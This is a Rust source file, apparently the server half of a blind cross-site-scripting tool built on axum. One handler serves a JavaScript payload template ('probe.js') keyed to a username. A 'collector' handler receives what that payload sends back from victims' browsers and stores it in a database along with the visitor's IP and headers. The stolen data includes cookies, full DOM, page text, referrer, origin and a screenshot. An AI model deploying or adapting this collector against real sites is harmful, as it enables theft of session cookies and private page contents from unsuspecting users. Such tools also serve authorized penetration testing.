use crate::auxiliary::serialize_headers;
use crate::State;
use axum::{
    extract::{ConnectInfo, Extension, Json, Path},
    http::{HeaderMap, StatusCode},
    response::IntoResponse,
};
use serde::Deserialize;
use std::net::SocketAddr;

// deliver the javascript payload from GET
pub async fn probe(
    Extension(state): Extension<State>,
    Path(user): Path<String>,
) -> impl IntoResponse {
    let public_url = std::env::var("PUBLIC_URL").unwrap();
    let template = state.jinja.get_template("probe.js").unwrap();
    axum::response::Html::from(
        template
            .render(minijinja::context! { HOST_URL => public_url, USERNAME => user })
            .unwrap(),
    )
}

#[derive(Deserialize)]
pub struct CallbackData {
    uri: String,
    cookies: String,
    referrer: String,
    user_agent: String,
    origin: String,
    title: String,
    text: String,
    dom: String,
    was_iframe: String,
    screenshot: String,
}

// collect info from probe
pub async fn collector(
    Extension(state): Extension<State>,
    Path(user): Path<String>,
    ConnectInfo(peer): ConnectInfo<SocketAddr>,
    Json(data): Json<CallbackData>,
    headers: HeaderMap,
) -> impl IntoResponse {
    println!("HIT\nHIT\nHIT");

    sqlx::query(
        "INSERT INTO pages
            (username, peer, headers,
             uri, cookies, referrer,
             user_agent, origin, title,
             text, dom, was_iframe)
         VALUES
            (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
    )
    .bind(user)
    .bind(peer.to_string())
    .bind(serialize_headers(headers))
    .bind(data.uri)
    .bind(data.cookies)
    .bind(data.referrer)
    .bind(data.user_agent)
    .bind(data.origin)
    .bind(data.title)
    .bind(data.text)
    .bind(data.dom)
    .bind(data.was_iframe)
    .execute(&state.db_pool)
    .await
    .unwrap();

    StatusCode::OK
}
